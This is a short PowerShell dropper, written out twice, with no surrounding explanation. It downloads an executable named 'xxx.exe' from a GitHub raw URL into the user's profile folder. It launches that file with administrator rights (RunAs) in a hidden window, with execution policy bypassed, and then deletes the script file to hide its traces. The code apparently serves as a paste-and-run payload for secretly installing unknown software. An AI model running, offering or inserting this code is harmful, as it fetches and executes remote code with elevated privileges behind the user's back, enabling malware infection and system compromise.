echo '$Url = "https://github.com/ooooooooo-o/ps1/raw/0/xxx.exe";[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = "SilentlyContinue";$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath "xxx.exe";Invoke-WebRequest -Uri $Url -OutFile $OutFile;$InstallerPath = $OutFile;$Arguments = "-fullinstall";$Command = "Start-Process -FilePath `$InstallerPath -ArgumentList `$Arguments -Verb RunAs -WindowStyle Hidden";Invoke-Expression -Command $Command;"
;del .\example.ps1;;;exit;' > example.ps1; powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\example.ps1;;;
$Url = "https://github.com/ooooooooo-o/ps1/raw/0/xxx.exe";[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = "SilentlyContinue";$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath "xxx.exe";Invoke-WebRequest -Uri $Url -OutFile $OutFile;$InstallerPath = $OutFile;$Arguments = "-fullinstall";$Command = "Start-Process -FilePath `$InstallerPath -ArgumentList `$Arguments -Verb RunAs -WindowStyle Hidden";Invoke-Expression -Command $Command;exit
;;;del .\example.ps1;exit;
